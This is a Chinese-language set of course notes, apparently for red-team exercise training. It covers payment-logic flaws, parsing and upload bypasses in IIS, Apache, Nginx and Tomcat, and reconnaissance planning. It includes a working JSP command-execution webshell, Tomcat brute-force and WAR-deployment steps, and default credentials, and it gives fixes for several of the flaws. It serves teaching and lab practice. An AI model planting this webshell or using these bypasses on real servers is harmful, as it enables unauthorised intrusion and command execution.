<p>业务逻辑<br>业务逻辑的内容包括四个部分：<br>领域实体：定义了业务中的对象，对象有属性和行为<br>业务规则：定义了需要完成一个动作，必须满足的条件<br>数据完整性：某些数据不可少<br>工作流：定义了领域实体之间的交互关系<br>以用户网购衣服为例：<br>领域实体：用户、资金账户、订单、衣服、发货单<br>业务规则：用户点击购买就会生成订单，但必须付了钱才会发货，生成发货单<br>数据完整性：网购必须登录网购平台账号，没有账号就不能成功购买<br>工作流：搜索衣服 -&gt; 找到合适衣服 -&gt; 下单购买 -&gt; 付款 -&gt; 收货</p>
<p>每个业务系统都具有不同的业务逻辑，而业务逻辑背后就是人的逻辑， 充分了解业务逻辑有助于找出其中的问题所在。业务逻辑漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误。业务逻辑漏洞出现于业务流程中（模块功能），也就是说网站的部分都有可能存在逻辑错误漏洞。</p>
<p>◼ 业务逻辑<br>常见业务逻辑问题：<br>➢ 支付逻辑<br>➢ 其他业务逻辑</p>
<p>支付逻辑漏洞<br>支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞。<br>支付流程通常为：选择商品和数量 → 选择支付和配送方式 → 生成订单 → 订单支付 → 完成<br>最常见的支付逻辑漏洞通常是由于服务器端没有对客户端请求数据中金额、数量等敏感信息做校验。支付逻辑漏洞一般在电子商务网站上容易出现，在支付流程中由于没有对客户端请求数据中的金额、数量等敏感信息作校验，带来“0元购”、“1分购”等漏洞，会对商家带来大量经济损失。</p>
<p>支付逻辑漏洞一般有以下几种情况：<br>➢ 支付过程中修改支付金额<br>➢ 支付过程中修改商品数量<br>➢ 支付过程中修改商品编号</p>
<p>◼ 预防思路<br>➢ 多重校验<br>➢ 人工审核（订单数值较大）</p>
<p>其他业务逻辑问题<br>其他业务逻辑问题一般有以下几种情况：<br>➢ API（应用程序编程接口）逻辑漏洞<br>➢ 客户端与API通信无加密<br>➢ 客户端与API通信无身份验证<br>➢ 其他安全问题</p>
<p>◼ API逻辑漏洞<br>在移动互联网的时代，Web服务已经成为了异构系统之间的互联与集成的主要手段，各种Web服务几乎都采用Web API来构建。通过Http协议的形式来以Get/Post方式发送请求, 返回json格式(数据更小巧且自描述能力强)的数据。Web Api接口的访问方式<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706205142941.png" alt="image-20220706205142941"></p>
<p>◼ API逻辑漏洞常见的安全问题<br>➢ 参数校验不完善<br>➢ 短信、邮箱炸弹<br>➢ 关键参数不加密</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706205205113.png" alt="image-20220706205205113"></p>
<p>◼ 客户端与API通信无加密<br>➢ 未加密风险<br>● 凭据<br>● 传输数据公开<br>● 资源信息泄露<br>➢ 中间人攻击</p>
<p>◼ 客户端与API通信无身份验证<br>➢ 信息泄露<br>➢ 应用程序被克隆<br>➢ 难以应对大规模拒绝服务攻击</p>
<p>◼ 其他安全问题<br>重放攻击的模式：<br>➢ 短信炸弹<br>➢ 重复下单<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706205250479.png" alt="image-20220706205250479"></p>
<p>◼ 其他安全问题<br>➢ 防止重放攻击<br>●时间戳和随机数的方式防止请求被重放</p>
<h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><h2 id="IIS漏洞"><a href="#IIS漏洞" class="headerlink" title="IIS漏洞"></a>IIS漏洞</h2><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS目前只适用于 Windows系统，不适用于其他操作系统。<br>解析漏洞<br>IIS 6.x 基于文件名 该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析分号及其后面的内容，相当于截断。</p>
<p>基于文件夹名 该版本默认会将 *.asp/目录下的所有文件当成Asp解析。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215251479.png" alt="image-20220706215251479"></p>
<p>1.asp;.jpg webshell文件<br>1.asp -&gt;asp文件解析</p>
<p>另外，IIS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp，从网站属性-&gt;主目录-&gt;配置 可以看出，他们都是调用了asp.dll进行的解析。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215338492.png" alt="image-20220706215338492"></p>
<p>修复建议<br>由于微软并不认为这是一个漏洞，也没有推出IIS 6.0的补丁，因此漏洞需要自己修复。①限制上传目录执行权限，不允许执行脚本。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215423742.png" alt="image-20220706215423742"></p>
<p>②不允许新建目录。</p>
<p>③上传的文件需经过重命名(时间戳+随机数+.jpg等)</p>
<p>IIS短文件漏洞 Windows 以 8.3 格式生成与 MS-DOS 兼容的短文件名，以允许基于MS-DOS 或 16 位 Windows的程序访问这些文件。在cmd下输入”dir /x”即可看到短文件名的效果。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215515987.png" alt="image-20220706215515987"></p>
<p>IIS短文件名产生：<br>1.当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。<br>2.当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。<br>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。 IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
<p>复现：<br>IIS8.0以下版本需要开启ASP.NET支持，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。 以下通过开启IIS6.0 ASP.NET后进行复现。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215616031.png" alt="image-20220706215616031"></p>
<p>当访问构造的某个存在的短文件名，会返回404<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215636631.png" alt="image-20220706215636631"></p>
<p>当访问构造的某个不存在的短文件名，会返回400；</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215658988.png" alt="image-20220706215658988"></p>
<p>IIS短文件漏洞局限性</p>
<ol>
<li>如果文件名本身太短也是无法猜解的；</li>
<li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</li>
<li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</li>
<li>如果文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</li>
<li>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215737899.png" alt="image-20220706215737899"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215749108.png" alt="image-20220706215749108"></p>
<p>修复建议<br>1）从CMD命令关闭NTFS8.3文件格式的支持    Windows Server 2003： (1代表关闭，0代表开启） 关闭该功能：fsutil behaviorset disable8dot3 1<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215823874.png" alt="image-20220706215823874"></p>
<p>Windows Server 2008 R2：<br>查询是否开启短文件名功能：fsutil 8dot3namequery 关闭该功能：fsutil 8dot3name set 1不同系统关闭命令稍有区别，该功能默认是开启的.</p>
<p>2）或从修改注册表关闭NTFS 8.3文件格式的支持 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口 找到路径：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215933465.png" alt="image-20220706215933465"></p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>Apache HTTPD 换行解析漏洞（ C V E - 2 0 1 7 - 1 5 7 1 5 ）<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220012493.png" alt="image-20220706220012493"></p>
<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br>漏洞环境<br>编译及运行漏洞环境：<br>docker-compose build<br>docker-compose up -d<br>启动后Apache运行在<a href="http://your-ip:8080。">http://your-ip:8080。</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220044293.png" alt="image-20220706220044293"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220101462.png" alt="image-20220706220101462"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220127856.png" alt="image-20220706220127856"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220139982.png" alt="image-20220706220139982"></p>
<p>访问刚才上传的/1.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220207574.png" alt="image-20220706220207574"></p>
<p><strong>Apache HTTPD 多后解析漏洞</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220334348.png" alt="image-20220706220334348"></p>
<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：<br>AddType text/html .html<br>AddLanguage zh-CN .cn<br>其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。<br>以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器：<br>AddHandler application/x-httpd-php .php<br>那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p>环境运行后，访问<a target="_blank" rel="noopener" href="http://your-ip/uploadfiles/apache.php.jpeg%E5%8D%B3%E5%8F%AF%E5%8F%91%E7%8E%B0%EF%BC%8Cphpinfo%E8%A2%AB%E6%89%A7%E8%A1%8C%E4%BA%86%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BAphp%E8%84%9A%E6%9C%AC%E3%80%82">http://your-ip/uploadfiles/apache.php.jpeg即可发现，phpinfo被执行了，该文件被解析为php脚本。</a><br><a target="_blank" rel="noopener" href="http://your-ip/index.php%E4%B8%AD%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BD%E5%90%8D%E5%8D%95%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%84%E4%BB%B6%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%AE%8C%E6%88%90%E5%90%8E%E5%B9%B6%E6%9C%AA%E9%87%8D%E5%91%BD%E5%90%8D%E3%80%82%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BAxxx.php.jpg%E6%88%96xxx.php.jpeg%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%88%A9%E7%94%A8Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8Cgetshell%E3%80%82">http://your-ip/index.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220355089.png" alt="image-20220706220355089"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220409898.png" alt="image-20220706220409898"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220422172.png" alt="image-20220706220422172"></p>
<h2 id="Tomact"><a href="#Tomact" class="headerlink" title="Tomact"></a>Tomact</h2><p><strong>通过 PUT 方法的 Tomcat 任意写入文件漏洞( C V E - 2 0 1 7 - 1 2 6 1 5 )</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Tomcat设置了写权限（readonly=<span class="literal">false</span>），导致我们可以将文件写入服务器。</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">	&lt;servlet-<span class="built_in">name</span>&gt;<span class="keyword">default</span>&lt;/servlet-<span class="built_in">name</span>&gt;</span><br><span class="line">	&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">	&lt;init-<span class="built_in">param</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-<span class="built_in">name</span>&gt;debug&lt;/<span class="built_in">param</span>-<span class="built_in">name</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-value&gt;<span class="number">0</span>&lt;/<span class="built_in">param</span>-value&gt;</span><br><span class="line">	&lt;/init-<span class="built_in">param</span>&gt;</span><br><span class="line">	&lt;init-<span class="built_in">param</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-<span class="built_in">name</span>&gt;listings&lt;/<span class="built_in">param</span>-<span class="built_in">name</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-value&gt;<span class="literal">false</span>&lt;/<span class="built_in">param</span>-value&gt;</span><br><span class="line">	&lt;/init-<span class="built_in">param</span>&gt;</span><br><span class="line">	&lt;init-<span class="built_in">param</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-<span class="built_in">name</span>&gt;readonly&lt;/<span class="built_in">param</span>-<span class="built_in">name</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-value&gt;<span class="literal">false</span>&lt;/<span class="built_in">param</span>-value&gt;</span><br><span class="line">	&lt;/init-<span class="built_in">param</span>&gt;</span><br><span class="line">	&lt;<span class="built_in">load</span>-on-startup&gt;<span class="number">1</span>&lt;/<span class="built_in">load</span>-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">虽然Tomcat在一定程度上检查了文件后缀（不能直接写jsp），但是我们还是可以通过一些文件系统的特性</span><br><span class="line">（比如/在Linux中使用）来绕过这个限制。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221010856.png" alt="image-20220706221010856"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221027308.png" alt="image-20220706221027308"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221039854.png" alt="image-20220706221039854"></p>
<p><strong>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</strong></p>
<p>Tomcat支持通过后端部署war文件，所以我们可以直接把webshell放到web目录下。为了访问后端，需要权限。<br>Tomcat7+的权限如下：<br>经理（后台管理）<br>manager-gui（html页面的权限）<br>manager-status（查看状态的权限）<br>manager-script（文本界面权限和状态权限）<br>manager-jmx（jmx 权限和状态权限）<br>host-manager（虚拟主机管理）<br>admin-gui（html页面的权限）<br>admin-script（文本界面的权限）</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221149893.png" alt="image-20220706221149893"><br>什么是基础认证爆破？<br>    1.Tomcat的默认管理入口<br>    2.通过中间件配置<br>基础认证爆破的特点？<br>    其中Authorization这一行才是认证的重点：<br>    Authorization: Basic YWRtaW46MTIzNDU2<br>    他的数据包是Basic+经过base64加密后发送<br>burpsuite如何对其爆破？<br>    payload type选择Custom iterator（自定义迭代器)；<br>    username:password<br>    一共分为三个部分：</p>
<ol>
<li>用户名</li>
<li>:(冒号)</li>
<li>密码</li>
<li>在Payload Processing中点击add添加相应的加密base64,在最后的Payload Encoding中取消urlencode加密特殊字符</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221323585.png" alt="image-20220706221323585"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221336764.png" alt="image-20220706221336764"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221350632.png" alt="image-20220706221350632"></p>
<p>基础认证爆破<br>最后我们得到密码为<br>Tomcat<br>tomcat</p>
<p>进入之后我们找到下面的上传点,但是它需要传一个war的包,我们先写一个jsp的小马,然后压缩成zip,在把zip改名为war,然后上传即可</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221439042.png" alt="image-20220706221439042"></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Jsp小马：</span><br><span class="line">&lt;% <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.get<span class="constructor">Parameter(<span class="string">&quot;pwd&quot;</span>)</span>))&#123; java.io.InputStream <span class="keyword">in</span> =</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(request.get<span class="constructor">Parameter(<span class="string">&quot;i&quot;</span>)</span>).get<span class="constructor">InputStream()</span>; <span class="built_in">int</span> a = -<span class="number">1</span>;</span><br><span class="line">byte<span class="literal">[]</span> b = <span class="keyword">new</span> byte<span class="literal">[<span class="number">2048</span>]</span>; out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>); <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-</span><br><span class="line"><span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> <span class="constructor">String(<span class="params">b</span>)</span>); &#125; out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>); &#125; %&gt;</span><br></pre></td></tr></table></figure>

<p>上传好小马后我们可以发现路径，未上传的war包是y.war，我们可以发现路径为:Ip/压缩包名/压缩包.jsp，系统会自动的解压该压缩包我们访问<a target="_blank" rel="noopener" href="http://ip/y/y.jsp%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE%E5%B0%8F%E9%A9%AC">http://ip/y/y.jsp就可以成功访问小马</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221529401.png" alt="image-20220706221529401"></p>
<p>访问小马后我们进行命令执行看看<a target="_blank" rel="noopener" href="http://192.168.6.103:8080/y/y.jsp?pwd=023&amp;i=ls%EF%BC%8C%E6%88%90%E5%8A%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%81%EF%BC%81%E5%BD%93%E7%84%B6%E8%BF%98%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E7%9A%84%E5%91%BD%E4%BB%A4">http://192.168.6.103:8080/y/y.jsp?pwd=023&amp;i=ls，成功命令执行！！当然还可以执行其他的命令</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221603831.png" alt="image-20220706221603831"></p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>N g i n x 文 件 名 逻 辑 漏 洞（ C V E - 2 0 1 3 - 4 5 4 7 ）影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220449850.png" alt="image-20220706220449850"></p>
<p>漏洞原理<br>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：<br>location ~ .php$ {<br>    include    fastcgi_params;<br>    fastcgi_pass 127.0.0.1:9000;<br>    fastcgi_index index.php;<br>    fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name;<br>    fastcgi_param DOCUMENT_ROOT /var/www/html;<br>}<br>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。</p>
<p>而存在CVE-2013-4547的情况下，我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则.php$，可<br>以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是1.gif[0x20]，就设置其为<br>SCRIPT<br>_<br>FILENAME的值发送给fastcgi。<br>fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。再举个例子，比如很多网站限制了允许访问后台的IP：<br>location /admin/ {<br>    allow 127.0.0.1;<br>    deny all;<br>}<br>我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是/test[0x20]/../admin/index.php文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫“test ”：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220611979.png" alt="image-20220706220611979"></p>
<p>这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个“1.gif ”，注<br>意后面的空格：访问<a target="_blank" rel="noopener" href="http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%8F%91%E7%8E%B0PHP%E5%B7%B2%E8%A2%AB%E8%A7%A3%E6%9E%90%EF%BC%9A![image-20220706220642429](./HW%E8%AF%BE%E7%A8%8B/image-20220706220642429.png)">http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php，即可发现PHP已被解析：![image-20220706220642429](./HW%E8%AF%BE%E7%A8%8B/image-20220706220642429.png)</a></p>
<p>Nginx解析漏洞复现。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220723291.png" alt="image-20220706220723291"></p>
<p>版本信息：Nginx 1.x 最新版    PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p>
<p>访问<a target="_blank" rel="noopener" href="http://your-ip/uploadfiles/nginx.png%E5%92%8Chttp://your-ip/uploadfiles/nginx.png/.php">http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php</a> 即可查看效果。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220753637.png" alt="image-20220706220753637"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220807528.png" alt="image-20220706220807528"></p>
<p>访问<a target="_blank" rel="noopener" href="http://your-ip/index.php%E5%8F%AF%E4%BB%A5%E6%B5%8B%E8%AF%95%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%EF%BC%8C%E4%B8%8A%E4%BC%A0%E4%BB%A3%E7%A0%81%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%86%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8D%B3%E5%8F%AFgetshell%EF%BC%9A">http://your-ip/index.php可以测试上传功能，上传代码不存在漏洞，但利用解析漏洞即可getshell：</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220825427.png" alt="image-20220706220825427"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220836902.png" alt="image-20220706220836902"></p>
<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>weblogic文件读取漏洞</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221647758.png" alt="image-20220706221647758"></p>
<p>弱口令<br>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/console%EF%BC%8C%E5%8D%B3%E4%B8%BAweblogic%E5%90%8E%E5%8F%B0%E3%80%82">http://your-ip:7001/console，即为weblogic后台。</a><br>本环境存在弱口令：weblogic   Oracle@123<br>weblogic常用弱口令：<a target="_blank" rel="noopener" href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a></p>
<h1 id="信息收集与外网打点"><a href="#信息收集与外网打点" class="headerlink" title="信息收集与外网打点"></a>信息收集与外网打点</h1><h2 id="作战方案规划"><a href="#作战方案规划" class="headerlink" title="作战方案规划"></a>作战方案规划</h2><p>关于红队</p>
<p>红队是一种全范围的多层攻击模拟，旨在衡量公司的人员和网络、应用程序和物理安全控制，用以抵御现实对手的攻击。在红队交战期间，攻击队员会制定攻击方案，以揭示潜在的物理、硬件、软件和人为漏洞。红队的参与也为坏的行为者和恶意内部人员提供了机会来破坏公司的系统和网络，或者损坏其数据。<br>渗透测试中只关注给定目标系统的漏洞，红队测试则完全不一样。红队在测试过程中关注的是如何规划一条攻击路径来达到目的。在整个红队测试过程中不一定要也不一定会发现目标组织的漏洞，只要能达到目的，任何形式的攻击手段都可以使用，包括但不限于web或者操作系统漏洞、社会工程学、物理渗透、攻击上下游合作供应商等。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707150710201.png" alt="image-20220707150710201"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707150734140.png" alt="image-20220707150734140"></p>
<p>攻防演练人员规划</p>
<p>在一般的攻防演习活动中所需的红队人员数为三人，三人分别是：队长、渗透师、横向师。红队人员都应涉及较为全面的技术领域，除此之外可以细分三人的技术领域和应有的能力<br>•队长：技术综合能力较强，应具备较好的团队协作能力、组织能力、应变能力；<br>•渗透师：前渗透能力较强，在演习过程中需能“稳、狠、准、快”的寻找到边界点并进行突破（打点）；<br>•横向师：后渗透能力较强，根据渗透师的打点结果进行梳理，横向渗透其他内网服务和主机，全面的评估内网的安全体系。</p>
<p>俗话说的好“三个臭皮匠顶一个诸葛亮”，红队评估这件事情从来都不是一个人的“战斗”，它需要团队协作共同完成。每个红队成员都有自己较为熟悉的技术领域，这也就导致了每个人所“打”的点和所“看”的面不同，要想全面的进行评估工作就需要协作平台将每个人的信息进行汇总便于每个人都能接触到“不同面”的信息。<br>协作平台的推荐<br>•Codimd - <a target="_blank" rel="noopener" href="https://github.com/hackmdio/codimd">https://github.com/hackmdio/codimd</a> （Markdown文档协作平台）<br>•<a target="_blank" rel="noopener" href="https://shimo.im/">https://shimo.im/</a> 石墨文档<br>•腾讯协同文档<br>•CobaltStrike - <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a> （后渗透团队协作平台）</p>
<p>攻击思路</p>
<p>首先，直接怼靶标系统肯定是很难进去的，而且很多靶标系统根本找不到，或者是非常难找到，只能在内网中访问，这就需要我们寻找突破口进入内网。而且目标这么多，一个团队的话，需要进行分工合作。刚开始，每人选择不同的目标进行突破，一旦找到突破口进入内网，则汇集团队之力一起打内网。打入内网之后，进行内网横向渗透，寻找目标靶机。打入内网通往靶标总的来说有三方面可以攻击：<br>•Web挖洞打点<br>•社工钓鱼<br>•供应链攻击<br>这三个攻击面，我们可以同时分配不同的人员同步进行，比较重要的是Web漏洞打点和社工钓鱼</p>
<h2 id="外-网-信-息-收-集"><a href="#外-网-信-息-收-集" class="headerlink" title="外 网 信 息 收 集"></a>外 网 信 息 收 集</h2><p><strong>外网信息收集概述</strong></p>
<p>拿到一个目标，不考虑钓鱼的情况下。如果正常从web入手，至少需要收集以下的信息。<br><strong>公司级别</strong></p>
<p>•公司的域名<br>•公司的子域名<br>•全资子公司（可能从下级单位打上去，但是光打了下级算不算分得看裁判和规则怎么评估）<br>•公司的ip信息（大公司可以直接跑C段）<br>一般经过上面的收集以后，我们能够获取到一系列的ip，域名信息。此时需要针对这些进行排除（比如说云上的资产等或者存在cdn的资产）</p>
<p>ip级别<br>当我们拿到了一系列的ip和域名以后，对于已经确定的ip，需要进行至少以下的信息收集<br>•ip是否为真实ip<br>•ip开启了哪些端口，可能存在哪些漏洞</p>
<p>用户级别<br>用户级别主要是涉及拿到一些用户的用户名等。便于进行暴力破解。<br>•github，google语法，官网，看官网邮箱格式，根据公司名字猜，<br>•还有公告里泄露人名，<br>•一些通用的如公司首字母+数字等。</p>
<p>对于web，至少需要收集框架，路径，登录接口，js中的敏感信息，网站中间件，服务器操作系统等。</p>
<p><strong>企业架构信息收集</strong></p>
